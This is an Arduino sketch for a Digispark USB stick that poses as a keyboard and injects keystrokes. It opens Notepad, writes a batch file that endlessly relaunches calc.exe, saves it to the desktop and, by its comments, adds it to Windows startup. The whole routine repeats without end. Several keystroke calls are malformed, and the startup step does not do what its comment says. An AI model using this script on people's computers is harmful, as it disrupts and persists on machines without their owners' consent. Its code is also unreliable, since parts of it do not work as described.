#include "DigiKeyboard.h"

void setup() {
  // Wait for 1 second
  DigiKeyboard.delay(1000);
}

void loop() {
  // Open Notepad
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("notepad");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1000);

  // Type the batch file code into Notepad
  DigiKeyboard.print("echo off\r\n:start\r\nstart calc.exe\r\nping -n 10 127.0.0.1 >nul\r\ngoto start");

  // Save the batch file to the desktop
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ALT, KEY_F);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_CTRL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("C:\\Users\\%USERNAME%\\Desktop\\calc.bat");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1000);

  // Close Notepad
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  // Create shortcut to the batch file in the Startup folder
  DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_S);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("calc.bat");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ALT, KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_CTRL, KEY_SHIFT, KEY_ESCAPE);
  DigiKeyboard.delay(500);

  // Wait for 10 seconds
  DigiKeyboard.delay(10000);
}
